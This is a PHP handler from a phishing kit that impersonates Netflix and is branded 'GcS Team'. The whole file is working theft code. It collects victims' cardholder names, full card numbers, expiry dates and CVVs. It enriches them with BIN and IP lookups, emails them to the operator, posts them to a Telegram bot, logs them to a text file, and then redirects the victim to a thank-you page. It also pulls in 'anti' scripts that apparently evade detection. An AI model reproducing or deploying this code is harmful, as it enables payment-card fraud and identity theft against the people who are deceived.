<?php
/*
  ________             _________    ___________                            
 /  _____/    ____    /   _____/    \__    ___/   ____   _____      _____  
/   \  ___  _/ ___\   \_____  \       |    |    _/ __ \  \__  \    /     \ 
\    \_\  \ \  \___   /        \      |    |    \  ___/   / __ \_ |  Y Y  \
 \______  /  \___  > /_______  /      |____|     \___  > (____  / |__|_|  /
        \/       \/          \/                      \/       \/        \/ 
*/
session_start();
include "../../anti/anti1.php";
include "../../anti/anti2.php"; 
include "../../anti/anti3.php"; 
include "../../anti/anti4.php"; 
include "../../anti/anti5.php"; 
include "../../anti/anti7.php";
include '../../email.php';
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[link: $link ]\r\n";


$_SESSION['cardholder'] = $_POST['cardholder'];
$_SESSION['creditCardNumber'] = $_POST['creditCardNumber'];
$_SESSION['creditExpirationMonth'] = $_POST['creditExpirationMonth'];
$_SESSION['creditCardSecurityCode'] = $_POST['creditCardSecurityCode'];



$file = fopen("NetFlix_RzlT.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));


$hostname = gethostbyaddr($ip);
$bincheck = $_POST['creditCardNumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['creditCardNumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$cardlastdigit = substr($_POST['creditCardNumber'],12,16);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);



$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$subject = "GcS Team 💖 NetFlix log 💖  $ip";
$headers = "From: GcS-Team<info@GcSTeam.com>";
$send = $email; 


$message = "[GcS Team][+]━━━━━━━━【💖 NetFlix log 💖】━━━━━━━━[+][GcS Team]\r\n";
$message .= "|Card Holder      	 : ".$_POST['cardholder']."\r\n";
$message .= "|[💳 Credit Card Number]     	 : ".$_POST['creditCardNumber']."\r\n";
$message .= "|[🔄 Expiry Date ]     	 : ".$_POST['creditExpirationMonth']."\r\n";
$message .= "|[🔑 (CVV)]    	 : ".$_POST['creditCardSecurityCode']."\r\n";
$message .= "UserAgent  :  ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[GcS Team][+]━━━━━━━━【💖 NetFlix log 💖】━━━━━━━━[+][GcS Team]\n";
$_SESSION['message'] = $message;
mail($send,$subject,$message,$headers);


file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );


$myfile = fopen("NetFlix_RzlT.txt", "a+");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);

HEADER("Location: ../thanks.php");


?>
